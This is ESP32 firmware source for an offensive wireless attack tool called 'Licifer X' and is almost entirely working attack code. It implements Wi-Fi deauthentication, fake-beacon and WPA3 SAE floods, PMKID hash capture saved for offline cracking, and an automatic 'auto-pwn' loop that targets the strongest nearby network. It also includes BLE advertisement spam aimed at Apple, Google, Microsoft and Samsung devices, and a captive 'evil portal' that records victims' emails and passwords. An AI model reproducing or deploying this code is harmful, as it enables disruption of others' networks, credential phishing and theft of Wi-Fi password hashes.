#include <Arduino.h>
#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <AsyncTCP.h>
#include <LittleFS.h>
#include <ArduinoJson.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <ESPCPUTemp.h> // https://github.com/PelicanHu/ESPCPUTemp
#include <NimBLEDevice.h>
#include <NimBLEAdvertising.h>
#include <NimBLEServer.h>
#include <NimBLEUtils.h>
#include <NimBLEClient.h>
#include <NimBLEDevice.h>

// ---------- Конфигурация платы ----------
#define FORMAT_LITTLEFS_IF_FAILED true
#define AP_SSID "Licifer_Setup"
#define AP_PASS "12345678" // Сменный через веб-интерфейс
#define AP_CHANNEL 6
#define AP_IP IPAddress(192, 168, 4, 1)
#define AP_MASK IPAddress(255, 255, 255, 0)

// Файловые пути
#define PMKID_FILE "/hashes.22000"
#define PORTAL_LOG "/portal_creds.txt"
#define SCAN_CACHE "/scan_cache.json"
#define CONFIG_FILE "/config.json"

// ---------- Глобальные переменные ----------
AsyncWebServer server(80);
AsyncWebSocket ws("/ws");
ESPCPUTemp tempSensor; // Датчик температуры

portMUX_TYPE attackMux = portMUX_INITIALIZER_UNLOCKED;

struct {
    bool deauth = false;
    bool beacon = false;
    bool karma = false;
    bool bleSpam = false;
    bool snifferActive = false;
    bool evilPortalActive = false;
    bool pmkidCaptureActive = false;
    bool saeFlood = false;
    bool autoPwn = false;
    
    uint8_t deauth_bssid[6] = {0};
    uint8_t deauth_sta[6] = {0};
    uint8_t deauth_ch = 1;
    int beaconCount = 50;
    String karmaSsid = "";
    int bleVariant = -1; // -1 = All, 0 = Apple, 1 = FastPair, 2 = SwiftPair, 3 = Samsung, 5 = AppleJuice
    
    // PMKID
    uint8_t pmkidBssid[6] = {0};
    uint8_t pmkidCh = 0;
    
    // Auto-Pwn
    unsigned long lastAutoPwnScan = 0;
    uint8_t autoPwnTarget[6] = {0};
    uint8_t autoPwnCh = 0;
    int autoPwnPhase = 0; // 0 = сканирование, 1 = деаут, 2 = захват PMKID
    
    // Статус
    int numNetworks = 0;
    unsigned long lastLogFlush = 0;
    
} attack;

// Буферы в PSRAM для логов
char* portalLogBuffer = nullptr;
char* pmkidBuffer = nullptr;
const int BUFFER_SIZE = 32768; // 32 КБ на логи
int portalLogLen = 0;
int pmkidBufferLen = 0;

// Кэш сетей
std::vector<DynamicJsonDocument> scanResults;

// Настройки
String apPassword = AP_PASS;

// ---------- Классы для BLE Spam ----------
struct BLEAdvert {
    String name;
    std::vector<uint8_t> manufacturerData;
    uint16_t manufacturerId;
    NimBLEUUID serviceUuid;
    std::vector<uint8_t> serviceData;
    bool hasServiceData;
};

// ---------- Работа с файлами ----------
void flushPortalLog() {
    if (portalLogLen > 0) {
        File f = LittleFS.open(PORTAL_LOG, "a");
        if (f) {
            f.write((uint8_t*)portalLogBuffer, portalLogLen);
            f.close();
        }
        portalLogLen = 0;
    }
}

void flushPMKIDFile() {
    if (pmkidBufferLen > 0) {
        File f = LittleFS.open(PMKID_FILE, "a");
        if (f) {
            f.write((uint8_t*)pmkidBuffer, pmkidBufferLen);
            f.close();
        }
        pmkidBufferLen = 0;
    }
}

// Безопасное добавление лога
void addPortalLog(const String& logEntry) {
    if (!portalLogBuffer) return;
    int len = logEntry.length();
    if (portalLogLen + len + 2 > BUFFER_SIZE) flushPortalLog();
    snprintf(portalLogBuffer + portalLogLen, BUFFER_SIZE - portalLogLen, "%s\n", logEntry.c_str());
    portalLogLen += len + 1;
}

void addPMKIDHash(const String& hash) {
    if (!pmkidBuffer) return;
    int len = hash.length();
    if (pmkidBufferLen + len + 2 > BUFFER_SIZE) flushPMKIDFile();
    snprintf(pmkidBuffer + pmkidBufferLen, BUFFER_SIZE - pmkidBufferLen, "%s\n", hash.c_str());
    pmkidBufferLen += len + 1;
}

// ---------- PMKID Grabber ----------
void capturePMKID(const uint8_t* bssid, uint8_t channel) {
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb([](void *buf, wifi_promiscuous_pkt_type_t type) {
        if (type == WIFI_PKT_DATA) {
            wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
            uint8_t *payload = pkt->payload;
            
            if (payload[24] == 0x88 && payload[25] == 0x8E) {
                uint8_t *eapol = payload + 26;
                if (eapol[5] == 2 || eapol[5] == 3) {
                    uint16_t keyDataLen = (eapol[97] << 8) | eapol[98];
                    if (keyDataLen >= 22) {
                        uint8_t *keyData = eapol + 99;
                        for (int i = 0; i < keyDataLen - 20; i++) {
                            if (keyData[i] == 0x30 && keyData[i+1] >= 20) {
                                uint8_t pmkidCount = keyData[i+14];
                                if (pmkidCount > 0) {
                                    char hash[1024];
                                    char bssidStr[18];
                                    snprintf(bssidStr, 18, "%02x%02x%02x%02x%02x%02x",
                                             attack.pmkidBssid[0], attack.pmkidBssid[1],
                                             attack.pmkidBssid[2], attack.pmkidBssid[3],
                                             attack.pmkidBssid[4], attack.pmkidBssid[5]);
                                    
                                    snprintf(hash, sizeof(hash), "%s*", bssidStr);
                                    for (int j = 0; j < 16; j++)
                                        snprintf(hash+strlen(hash), 3, "%02x", keyData[i+17+j]);
                                    
                                    String bssidFormatted = bssidStr;
                                    bssidFormatted = bssidFormatted.substring(0,2) + ":" +
                                        bssidFormatted.substring(2,4) + ":" +
                                        bssidFormatted.substring(4,6) + ":" +
                                        bssidFormatted.substring(6,8) + ":" +
                                        bssidFormatted.substring(8,10) + ":" +
                                        bssidFormatted.substring(10,12);
                                    
                                    snprintf(hash+strlen(hash), sizeof(hash)-strlen(hash),
                                             "*%s", bssidFormatted.c_str());
                                    
                                    addPMKIDHash(String(hash));
                                    
                                    attack.pmkidCaptureActive = false;
                                    esp_wifi_set_promiscuous(false);
                                }
                            }
                        }
                    }
                }
            }
        }
    });
    
    uint8_t assocReq[200] = {
        0x00, 0x00, 0x00, 0x00,
    };
    memset(assocReq+4, 0xFF, 6);
    memcpy(assocReq+10, bssid, 6);
    memcpy(assocReq+16, bssid, 6);
    assocReq[24] = 0x00; assocReq[25] = 0x00;
    assocReq[34] = 0x11; assocReq[35] = 0x04;
    
    int pos = 36;
    assocReq[pos++] = 0x00; assocReq[pos++] = 0x00;
    assocReq[pos++] = 0x01; assocReq[pos++] = 0x04;
    assocReq[pos++] = 0x82; assocReq[pos++] = 0x84;
    assocReq[pos++] = 0x8b; assocReq[pos++] = 0x96;
    
    assocReq[pos++] = 0x30; assocReq[pos++] = 18;
    assocReq[pos++] = 0x01; assocReq[pos++] = 0x00;
    memcpy(assocReq+pos, "\x00\x0f\xac\x04", 4); pos += 4;
    assocReq[pos++] = 0x01; assocReq[pos++] = 0x00;
    memcpy(assocReq+pos, "\x00\x0f\xac\x04", 4); pos += 4;
    assocReq[pos++] = 0x01; assocReq[pos++] = 0x00;
    memcpy(assocReq+pos, "\x00\x0f\xac\x02", 4); pos += 4;
    assocReq[pos++] = 0x01; assocReq[pos++] = 0x00;
    memset(assocReq+pos, 0, 16); pos += 16;
    
    esp_wifi_80211_tx(WIFI_IF_STA, assocReq, pos, false);
}

// ---------- BLE Spam с корректными данными ----------
void startBleAdvertising(int variant) {
    NimBLEAdvertising* pAdv = NimBLEDevice::getAdvertising();
    pAdv->stop();
    NimBLEAdvertisementData advData;
    
    switch(variant) {
        case 0: { // Sour Apple (более агрессивный)
            advData.setFlags(0x1A);
            uint8_t apple[27] = {
                0x1b, 0xff, 0x4c, 0x00, 0x01, 0x07, 0x00, 0x01,
                0x10, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00
            };
            advData.setManufacturerData(std::string((char*)apple, 27));
            break;
        }
        case 1: { // Google Fast Pair
            advData.setFlags(0x06);
            uint8_t modelId[3] = {0x00, 0x00, 0x00};
            advData.setServiceData(NimBLEUUID("0000fe2c-0000-1000-8000-00805f9b34fb"),
                                   std::string((char*)modelId, 3));
            break;
        }
        case 2: { // Microsoft Swift Pair
            advData.setFlags(0x06);
            uint8_t swiftPair[6] = {0x01, 0x00, 0x00, 0x00, 0x00, 0x00};
            advData.setManufacturerData(0x0006, std::string((char*)swiftPair, 6));
            break;
        }
        case 3: { // Samsung Spam
            advData.setFlags(0x06);
            uint8_t samsung[2] = {0x00, 0x00};
            advData.setManufacturerData(0x0075, std::string((char*)samsung, 2));
            break;
        }
        case 5: { // AppleJuice (обычный спам)
            advData.setFlags(0x1A);
            uint8_t juice[7] = {0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
            advData.setManufacturerData(0x004C, std::string((char*)juice, 7));
            break;
        }
        default: break;
    }
    pAdv->setAdvertisementData(advData);
    pAdv->start();
}

// ---------- Deauth и Beacon ----------
void sendDeauthPacket(const uint8_t* bssid, uint8_t channel) {
    esp_wifi_set_channel(channel, WIFI_SEC_CHAN_NONE);
    delayMicroseconds(500);
    uint8_t pkt[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    };
    memcpy(pkt+10, bssid, 6);
    memcpy(pkt+16, bssid, 6);
    pkt[24] = 0x07; pkt[25] = 0x00;
    esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), false);
}

void sendBeaconFrame(const String& ssid, uint8_t channel) {
    esp_wifi_set_channel(channel, WIFI_SEC_CHAN_NONE);
    delayMicroseconds(500);
    uint8_t bcn[128] = {0};
    bcn[0] = 0x80; bcn[1] = 0x00;
    memset(bcn+4, 0xFF, 6);
    for (int j = 0; j < 6; j++) bcn[10+j] = random(256);
    memcpy(bcn+16, bcn+10, 6);
    bcn[24] = 0x00; bcn[25] = 0x00;
    bcn[32] = 0x64; bcn[33] = 0x00;
    bcn[34] = 0x01; bcn[35] = 0x04;
    
    int pos = 36;
    bcn[pos++] = 0x00;
    bcn[pos++] = min((int)ssid.length(), 32);
    memcpy(bcn+pos, ssid.c_str(), min((int)ssid.length(), 32));
    pos += min((int)ssid.length(), 32);
    
    bcn[pos++] = 0x01; bcn[pos++] = 0x08;
    bcn[pos++] = 0x82; bcn[pos++] = 0x84; bcn[pos++] = 0x8b; bcn[pos++] = 0x96;
    bcn[pos++] = 0x24; bcn[pos++] = 0x30; bcn[pos++] = 0x48; bcn[pos++] = 0x6c;
    
    bcn[pos++] = 0x03; bcn[pos++] = 0x01;
    bcn[pos++] = channel;
    
    esp_wifi_80211_tx(WIFI_IF_AP, bcn, pos, false);
}

// ========== FreeRTOS Задачи ==========

// Задача WiFi атак (ядро 0)
void wifiAttackTask(void *param) {
    const char* beaconSsids[] = {
        "Free WiFi", "Starbucks WiFi", "McDonald's Guest",
        "Airport_Free", "Hotel_WiFi", "Coffee_Shop", "Premium_Network"
    };
    unsigned long lastDeauth = 0;
    unsigned long lastBeacon = 0;
    
    while(1) {
        // Управление мощностью WiFi/BLE в зависимости от температуры
        if (tempSensor.tempAvailable()) {
            float temp = tempSensor.getTemp();
            if (temp > 70.0) {
                NimBLEDevice::setPower(3); // Снижаем мощность при перегреве
            } else {
                NimBLEDevice::setPower(9);
            }
        }
        
        if (attack.deauth) {
            if (millis() - lastDeauth > 100) {
                lastDeauth = millis();
                sendDeauthPacket(attack.deauth_bssid, attack.deauth_ch);
            }
        }
        
        if (attack.beacon) {
            if (millis() - lastBeacon > 200) {
                lastBeacon = millis();
                for (int i = 0; i < attack.beaconCount; i++) {
                    String ssid = String(beaconSsids[i % 7]) + "-" + String(random(100, 999));
                    sendBeaconFrame(ssid, random(1, 14));
                    delay(5);
                }
            }
        }
        
        // SAE Flood (WPA3 атака)
        if (attack.saeFlood) {
            uint8_t saeReq[200] = {
                0x00, 0x00, 0x00, 0x00,
            };
            memset(saeReq+4, 0xFF, 6);
            memcpy(saeReq+10, attack.deauth_bssid, 6);
            memcpy(saeReq+16, attack.deauth_bssid, 6);
            saeReq[24] = 0x00; saeReq[25] = 0x00;
            saeReq[34] = 0x11; saeReq[35] = 0x04;
            
            int pos = 36;
            saeReq[pos++] = 0x00; saeReq[pos++] = 0x00;
            saeReq[pos++] = 0x01; saeReq[pos++] = 0x04;
            saeReq[pos++] = 0x82; saeReq[pos++] = 0x84;
            saeReq[pos++] = 0x8b; saeReq[pos++] = 0x96;
            
            // RSN IE с AKM Suite для SAE (00 0f ac 08)
            saeReq[pos++] = 0x30; saeReq[pos++] = 18;
            saeReq[pos++] = 0x01; saeReq[pos++] = 0x00;
            memcpy(saeReq+pos, "\x00\x0f\xac\x04", 4); pos += 4;
            saeReq[pos++] = 0x01; saeReq[pos++] = 0x00;
            memcpy(saeReq+pos, "\x00\x0f\xac\x04", 4); pos += 4;
            saeReq[pos++] = 0x01; saeReq[pos++] = 0x00;
            memcpy(saeReq+pos, "\x00\x0f\xac\x08", 4); pos += 4; // SAE AKM
            saeReq[pos++] = 0x01; saeReq[pos++] = 0x00;
            memset(saeReq+pos, 0, 16); pos += 16;
            
            esp_wifi_80211_tx(WIFI_IF_STA, saeReq, pos, false);
            delay(10);
        }
        
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }
}

// Задача Auto-Pwn (автоматический захват хешей) (ядро 1)
void autoPwnTask(void *param) {
    while(1) {
        if (!attack.autoPwn) {
            vTaskDelay(1000);
            continue;
        }
        
        // Фаза 0: сканирование
        if (attack.autoPwnPhase == 0) {
            WiFi.scanNetworks(true);
            delay(5000);
            int n = WiFi.scanComplete();
            if (n > 0) {
                int bestRssi = -100;
                int bestIdx = 0;
                for (int i = 0; i < n; i++) {
                    if (WiFi.RSSI(i) > bestRssi && WiFi.encryptionType(i) != WIFI_AUTH_OPEN) {
                        bestRssi = WiFi.RSSI(i);
                        bestIdx = i;
                    }
                }
                String bssid = WiFi.BSSIDstr(bestIdx);
                sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                       &attack.autoPwnTarget[0], &attack.autoPwnTarget[1],
                       &attack.autoPwnTarget[2], &attack.autoPwnTarget[3],
                       &attack.autoPwnTarget[4], &attack.autoPwnTarget[5]);
                attack.autoPwnCh = WiFi.channel(bestIdx);
                attack.autoPwnPhase = 1;
            }
            WiFi.scanDelete();
        }
        
        // Фаза 1: деаут и подготовка к захвату
        if (attack.autoPwnPhase == 1) {
            for (int i = 0; i < 20; i++) {
                sendDeauthPacket(attack.autoPwnTarget, attack.autoPwnCh);
                delay(50);
            }
            memcpy(attack.pmkidBssid, attack.autoPwnTarget, 6);
            attack.pmkidCh = attack.autoPwnCh;
            attack.pmkidCaptureActive = true;
            capturePMKID(attack.autoPwnTarget, attack.autoPwnCh);
            attack.autoPwnPhase = 0; // Возвращаемся к сканированию
            delay(5000);
        }
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }
}

// Задача BLE атак (ядро 0)
void bleSpamTask(void *param) {
    NimBLEDevice::init("Licifer_BLE");
    NimBLEDevice::setPower(6); // Не сразу на максимум, чтобы избежать перегрева
    unsigned long lastBleTime = 0;
    int currentVariant = 0;
    
    while(1) {
        if (attack.bleSpam) {
            if (millis() - lastBleTime > 200) {
                lastBleTime = millis();
                if (attack.bleVariant == -1) {
                    currentVariant = (currentVariant + 1) % 4;
                } else {
                    currentVariant = attack.bleVariant;
                }
                startBleAdvertising(currentVariant);
            }
        }
        vTaskDelay(50 / portTICK_PERIOD_MS);
    }
}

// Веб-сервер и управление (ядро 0)
void webServerTask(void *param) {
    // WebSocket
    ws.onEvent([](AsyncWebSocket *serv, AsyncWebSocketClient *client,
                  AwsEventType type, void *arg, uint8_t *data, size_t len) {
        if (type == WS_EVT_DATA) {
            data[len] = 0;
            DynamicJsonDocument doc(1024);
            deserializeJson(doc, data);
            String cmd = doc["cmd"];
            
            portENTER_CRITICAL(&attackMux);
            
            // WiFi атаки
            if (cmd == "start_deauth") {
                attack.deauth = true;
                sscanf(doc["bssid"].as<const char*>(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                       &attack.deauth_bssid[0], &attack.deauth_bssid[1],
                       &attack.deauth_bssid[2], &attack.deauth_bssid[3],
                       &attack.deauth_bssid[4], &attack.deauth_bssid[5]);
                attack.deauth_ch = doc["channel"] | 1;
            } else if (cmd == "stop_deauth") { attack.deauth = false; }
            else if (cmd == "start_beacon") {
                attack.beacon = true;
                if (doc.containsKey("count")) attack.beaconCount = doc["count"];
            } else if (cmd == "stop_beacon") { attack.beacon = false; }
            else if (cmd == "start_karma") { attack.karma = true; }
            else if (cmd == "stop_karma") { attack.karma = false; }
            else if (cmd == "grab_pmkid") {
                attack.pmkidCaptureActive = true;
                sscanf(doc["bssid"].as<const char*>(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                       &attack.pmkidBssid[0], &attack.pmkidBssid[1],
                       &attack.pmkidBssid[2], &attack.pmkidBssid[3],
                       &attack.pmkidBssid[4], &attack.pmkidBssid[5]);
                attack.pmkidCh = doc["channel"] | 1;
            } else if (cmd == "sae_flood") {
                attack.saeFlood = true;
                sscanf(doc["bssid"].as<const char*>(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                       &attack.deauth_bssid[0], &attack.deauth_bssid[1],
                       &attack.deauth_bssid[2], &attack.deauth_bssid[3],
                       &attack.deauth_bssid[4], &attack.deauth_bssid[5]);
            } else if (cmd == "stop_sae_flood") { attack.saeFlood = false; }
            else if (cmd == "start_auto_pwn") { attack.autoPwn = true; }
            else if (cmd == "stop_auto_pwn") { attack.autoPwn = false; }
            
            // BLE атаки
            else if (cmd == "start_ble_spam") {
                attack.bleSpam = true;
                if (doc.containsKey("variant")) {
                    String v = doc["variant"];
                    if (v == "apple") attack.bleVariant = 0;
                    else if (v == "google") attack.bleVariant = 1;
                    else if (v == "microsoft") attack.bleVariant = 2;
                    else if (v == "samsung") attack.bleVariant = 3;
                    else attack.bleVariant = -1;
                }
            } else if (cmd == "stop_ble_spam") { attack.bleSpam = false; }
            else if (cmd == "ble_applejuice") { attack.bleSpam = true; attack.bleVariant = 5; }
            else if (cmd == "ble_sourapple") { attack.bleSpam = true; attack.bleVariant = 0; }
            else if (cmd == "ble_fastpair") { attack.bleSpam = true; attack.bleVariant = 1; }
            else if (cmd == "ble_swiftpair") { attack.bleSpam = true; attack.bleVariant = 2; }
            else if (cmd == "ble_samsung") { attack.bleSpam = true; attack.bleVariant = 3; }
            
            // Evil Portal
            else if (cmd == "start_evil_portal") { attack.evilPortalActive = true; }
            else if (cmd == "stop_evil_portal") { attack.evilPortalActive = false; }
            else if (cmd == "set_portal_ssid") {
                String newSsid = doc["ssid"] | "Corporate_Free_WiFi";
                WiFi.softAP(newSsid.c_str(), nullptr);
            }
            
            // Управление логами
            else if (cmd == "flush_logs") {
                flushPortalLog();
                flushPMKIDFile();
            }
            else if (cmd == "clear_portal_log") {
                LittleFS.remove(PORTAL_LOG);
                portalLogLen = 0;
            }
            else if (cmd == "clear_pmkid") {
                LittleFS.remove(PMKID_FILE);
                pmkidBufferLen = 0;
            }
            
            // Настройки
            else if (cmd == "set_password") {
                String newPass = doc["password"].as<String>();
                if (newPass.length() >= 8) {
                    apPassword = newPass;
                    WiFi.softAP(AP_SSID, apPassword.c_str());
                    // Сохраняем в файл
                    DynamicJsonDocument cfg(256);
                    cfg["ap_pass"] = apPassword;
                    File f = LittleFS.open(CONFIG_FILE, "w");
                    if (f) { serializeJson(cfg, f); f.close(); }
                }
            }
            
            // Сканирование
            else if (cmd == "start_scan") { WiFi.scanNetworks(true); }
            else if (cmd == "start_sniffer") {
                attack.snifferActive = true;
                esp_wifi_set_promiscuous(true);
            }
            else if (cmd == "stop_sniffer") {
                attack.snifferActive = false;
                esp_wifi_set_promiscuous(false);
            }
            
            portEXIT_CRITICAL(&attackMux);
        }
    });
    
    server.addHandler(&ws);
    
    // Статические маршруты
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send(LittleFS, "/index.html", "text/html");
    });
    
    server.on("/api/scan", HTTP_GET, [](AsyncWebServerRequest *request) {
        WiFi.scanNetworks(true);
        request->send(200, "text/plain", "Scan started");
    });
    
    server.on("/api/portal_data", HTTP_GET, [](AsyncWebServerRequest *request) {
        flushPortalLog(); // Сбрасываем буфер перед чтением
        if (LittleFS.exists(PORTAL_LOG)) {
            request->send(LittleFS, PORTAL_LOG, "text/plain");
        } else {
            request->send(200, "text/plain", "");
        }
    });
    
    server.on("/api/pmkid_data", HTTP_GET, [](AsyncWebServerRequest *request) {
        flushPMKIDFile();
        if (LittleFS.exists(PMKID_FILE)) {
            request->send(LittleFS, PMKID_FILE, "text/plain");
        } else {
            request->send(200, "text/plain", "");
        }
    });
    
    // Evil Portal Captive
    server.on("/portal/login", HTTP_POST, [](AsyncWebServerRequest *request) {
        String email = request->arg("email");
        String password = request->arg("password");
        String logEntry = "[" + String(millis()) + "] Email: " + email + " Pass: " + password;
        addPortalLog(logEntry);
        
        String response = "<!DOCTYPE html><html><head>";
        response += "<meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">";
        response += "<title>Вход выполнен</title>";
        response += "<style>body{font-family:Arial,sans-serif;background:#0b0f1a;color:#eee;display:flex;justify-content:center;align-items:center;height:100vh;margin:0} .card{background:#131824;padding:30px;border-radius:12px;text-align:center} h2{color:#0ff} button{background:#0ff;color:#000;border:none;padding:10px 20px;border-radius:6px;font-weight:bold;cursor:pointer;margin-top:15px}</style>";
        response += "</head><body><div class=\"card\"><h2>✅ Вход выполнен успешно</h2><p>Перенаправление...</p><button onclick=\"window.location.href='http://example.com'\">Продолжить</button></div></body></html>";
        request->send(200, "text/html", response);
    });
    
    // Captive Portal Redirects
    server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->redirect("/portal/login");
    });
    server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->redirect("/portal/login");
    });
    
    // DNS Redirect для captive portal
    server.on("/api/system_info", HTTP_GET, [](AsyncWebServerRequest *request) {
        DynamicJsonDocument info(512);
        info["psram_total"] = ESP.getPsramSize();
        info["psram_free"] = ESP.getFreePsram();
        info["flash_total"] = LittleFS.totalBytes();
        info["flash_free"] = LittleFS.usedBytes();
        info["uptime"] = millis();
        if (tempSensor.tempAvailable()) {
            info["temp"] = tempSensor.getTemp();
        }
        String json;
        serializeJson(info, json);
        request->send(200, "application/json", json);
    });
    
    server.begin();
    Serial.println("Web server started on http://192.168.4.1");
    
    // Периодическая рассылка данных
    while(1) {
        // Отправка данных сканирования
        int n = WiFi.scanComplete();
        if (n > 0) {
            DynamicJsonDocument scanDoc(16384);
            JsonArray networks = scanDoc.createNestedArray("networks");
            for (int i = 0; i < n && i < 100; i++) {
                JsonObject net = networks.createNestedObject();
                String ssid = WiFi.SSID(i);
                net["ssid"] = ssid.isEmpty() ? "Скрытая" : ssid;
                net["bssid"] = WiFi.BSSIDstr(i);
                net["channel"] = WiFi.channel(i);
                net["rssi"] = WiFi.RSSI(i);
                net["enc"] = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "Open" :
                              (WiFi.encryptionType(i) == WIFI_AUTH_WEP) ? "WEP" :
                              (WiFi.encryptionType(i) == WIFI_AUTH_WPA_PSK) ? "WPA" :
                              (WiFi.encryptionType(i) == WIFI_AUTH_WPA2_PSK) ? "WPA2" :
                              "WPA3/WPA2";
                net["wps"] = false;
            }
            String json;
            serializeJson(scanDoc, json);
            ws.textAll(json);
            attack.numNetworks = n;
            WiFi.scanDelete();
        }
        
        // Статус атак
        DynamicJsonDocument status(1024);
        status["deauth"] = attack.deauth;
        status["beacon"] = attack.beacon;
        status["karma"] = attack.karma;
        status["ble"] = attack.bleSpam;
        status["sniffer"] = attack.snifferActive;
        status["evil_portal"] = attack.evilPortalActive;
        status["auto_pwn"] = attack.autoPwn;
        status["pmkid_count"] = 0;
        if (LittleFS.exists(PMKID_FILE)) {
            // Подсчет строк в файле
            File f = LittleFS.open(PMKID_FILE, "r");
            if (f) {
                int cnt = 0;
                while (f.available()) { if (f.read() == '\n') cnt++; }
                f.close();
                status["pmkid_count"] = cnt;
            }
        }
        String statusJson;
        serializeJson(status, statusJson);
        ws.textAll(statusJson);
        
        // Периодический сброс буферов на Flash
        if (millis() - attack.lastLogFlush > 300000) { // каждые 5 минут
            attack.lastLogFlush = millis();
            flushPortalLog();
            flushPMKIDFile();
        }
        
        vTaskDelay(2000 / portTICK_PERIOD_MS);
    }
}

// ---------- Probe Request Callback ----------
void promiscuousCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type == WIFI_PKT_MGMT) {
        wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
        uint8_t *frame = pkt->payload;
        if ((frame[0] & 0xFC) == 0x40) {
            uint8_t *srcMac = frame + 10;
            int rssi = pkt->rx_ctrl.rssi;
            uint8_t ssidLen = frame[25];
            if (ssidLen > 32) return;
            char ssid[33] = {0};
            memcpy(ssid, frame + 26, ssidLen);
            
            if (attack.karma && ssidLen > 0 && attack.karmaSsid.isEmpty()) {
                attack.karmaSsid = String(ssid);
            }
            
            DynamicJsonDocument clientDoc(512);
            JsonArray clients = clientDoc.createNestedArray("clients");
            JsonObject client = clients.createNestedObject();
            char macStr[18];
            snprintf(macStr, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
                     srcMac[0], srcMac[1], srcMac[2],
                     srcMac[3], srcMac[4], srcMac[5]);
            client["mac"] = macStr;
            client["rssi"] = rssi;
            client["ssid"] = String(ssid);
            
            String json;
            serializeJson(clientDoc, json);
            ws.textAll(json);
        }
    }
}

// ========== Инициализация ==========
void setup() {
    Serial.begin(115200);
    delay(1000);
    Serial.println("\n\n--- LICIFER X (N16R8) ---");
    Serial.printf("Flash: 16 MB, PSRAM: %d MB\n", ESP.getPsramSize() / (1024*1024));
    
    // Выделяем память для буферов в PSRAM
    if (psramFound()) {
        portalLogBuffer = (char*)ps_malloc(BUFFER_SIZE);
        pmkidBuffer = (char*)ps_malloc(BUFFER_SIZE);
        if (portalLogBuffer) memset(portalLogBuffer, 0, BUFFER_SIZE);
        if (pmkidBuffer) memset(pmkidBuffer, 0, BUFFER_SIZE);
    }
    if (!portalLogBuffer) portalLogBuffer = (char*)malloc(BUFFER_SIZE);
    if (!pmkidBuffer) pmkidBuffer = (char*)malloc(BUFFER_SIZE);
    
    // Температура
    if (!tempSensor.begin()) {
        Serial.println("Temperature sensor not available");
    }
    
    // Монтирование LittleFS
    if (!LittleFS.begin(FORMAT_LITTLEFS_IF_FAILED)) {
        Serial.println("ERROR: LittleFS mount failed!");
        return;
    }
    Serial.printf("LittleFS: %d KB free\n", LittleFS.totalBytes() / 1024);
    
    // Создаем начальные файлы
    if (!LittleFS.exists(PORTAL_LOG)) {
        File f = LittleFS.open(PORTAL_LOG, "w");
        if (f) f.close();
    }
    if (!LittleFS.exists(PMKID_FILE)) {
        File f = LittleFS.open(PMKID_FILE, "w");
        if (f) f.close();
    }
    
    // Загружаем настройки
    if (LittleFS.exists(CONFIG_FILE)) {
        File f = LittleFS.open(CONFIG_FILE, "r");
        if (f) {
            DynamicJsonDocument cfg(256);
            deserializeJson(cfg, f);
            f.close();
            apPassword = cfg["ap_pass"] | AP_PASS;
        }
    }
    
    // WiFi в режиме AP+STA
    WiFi.mode(WIFI_AP_STA);
    WiFi.softAPConfig(AP_IP, AP_IP, AP_MASK);
    WiFi.softAP(AP_SSID, apPassword.c_str());
    Serial.printf("AP: %s (pass: %s) on %s\n", AP_SSID, apPassword.c_str(), AP_IP.toString().c_str());
    
    // Promiscuous mode
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
    
    // DNS Server для Evil Portal
    // Встроенный в ESPAsyncWebServer
    
    // Запускаем FreeRTOS задачи
    xTaskCreatePinnedToCore(webServerTask, "websrv", 16384, NULL, 1, NULL, 0);
    xTaskCreatePinnedToCore(wifiAttackTask, "wifiatk", 8192, NULL, 2, NULL, 0);
    xTaskCreatePinnedToCore(bleSpamTask, "bleatk", 4096, NULL, 2, NULL, 1);
    xTaskCreatePinnedToCore(autoPwnTask, "autopwn", 4096, NULL, 2, NULL, 1);
    
    Serial.println("Licifer X 3.0 ready. Connect to WiFi and open http://192.168.4.1");
}

void loop() {
    vTaskDelay(1000 / portTICK_PERIOD_MS);
}